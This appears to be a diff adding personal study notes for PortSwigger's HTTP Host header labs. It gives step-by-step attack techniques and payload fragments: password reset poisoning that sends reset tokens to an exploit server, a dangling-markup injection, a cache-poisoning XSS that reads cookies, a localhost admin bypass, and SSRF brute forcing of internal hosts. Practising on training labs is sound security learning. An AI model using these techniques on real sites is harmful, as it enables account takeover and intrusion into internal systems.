@@ -1,0 +1,67 @@
+HTTP Host header attacks
+
+https://portswigger.net/web-security/host-header
+
+
+
+Password reset poisoning
+	
+	Basic password reset poisoning
+		Forgot Password page contain Host header vulnerability. Password reset link is sent with token via email. Notice that we can change Host Header with any arbitrary payload. so capture "POST /forgot-password" request and change Host header with our exploit server like "Host: Exploit Server". then check access logs of our exploit server to view valid token and change password for carlos.
+
+
+	
+	Password reset poisoning via middleware
+		Forgot Password page contain Host header vulnerability. Password reset link is sent with token via email. Notice that we can use X-Forwarded-Host header to change Host header with our payload. so capture "POST /forgot-password" request and set header - "X-Forwarded-Host: Exploit Server". send request and then check access logs of our exploit server to view valid token change password for carlos.
+
+
+		Password reset poisoning via dangling markup
+		Forgot Password page contain Host header vulnerability. Password reset link is sent with clear text into email body. Notice that we can abuse Host header port like "Host: vulnerablesite:PAYLOAD". send this request to reset password to  our own user (wiener) and observe that port PAYLOAD is reflected into raw view HTML of email. so send the "POST /forgot-password" request again, but this time set PAYLOAD to break out of the string and inject a dangling-markup payload pointing to your exploit server - HOST: vulnerablesite:'<a href="Exploit Server/?. send request and then check access logs of our exploit server where password is captured with clear text. 
+	
+
+
+---------------------------------------------------------------------------------
+
+
+
+Web cache poisoning via the Host header
+	Web cache poisoning via ambiguous requests
+		Website contain  Host header vulnerability with cache poisoning. intercept home page and notice that if we use second Host header first one is ignored and second one is reflected into HTML which cause XSS. so use second Host header "Host: Exploit Server". Go to exploit serve  and create file at "/resources/js/tracking.js" containing the payload alert(document.cookie). send request until X-Cache get hit and reload home page which cause alert.
+
+
+
+
+
+Accessing restricted functionality
+	Host header authentication bypass
+		Website contain Host header vulnerability. Go to website and open /admin page. notice that is only accessable for local users. so change Host header to localhost - "Host: localhost" and send request to /admin page and delete user carlos.
+
+
+
+---------------------------------------------------------------------------------------
+
+
+Routing-based SSRF
+	Routing-based SSRF
+		Website contain Host header vulnerability with SSRF. intercept home page and run Turbo intruder which brute force internal hosts from 192.168.0.0/24 - "Host: 192.168.0.%s". notice that 192.168.0.16 gets 302 stutus code which redirect us to /admin page where we can delete users.
+
+
+	SSRF via flawed request parsing	
+		Website contain Host header vulneravbility with SSRF. intercept home page and run Turbo intruder against Host header which reveals active internal hosts. notice that every request is blocked due to 403 error which is forbidden. to bypass this we can use full URL with "GET / " header like - "GET https://OurWebsite.com". so brute force Host header with 192.168.0.0/24 with full url GET request and notice that 192.168.0.203 is admin page where we can delete carlos. only 3 thing we need - csrf token which is in /admin request, usernampe parameter which is carlos and session which is in response header. then send request with POST.
+
+
+
+
+------------------------------------------------------------------------------------------
+
+
+
+Connection state attacks
+	Host validation bypass via connection state attack
+		Complicated: https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack
+
+
+
+SSRF via a malformed request line
+
+---------------------------------------------------------------------------------------------
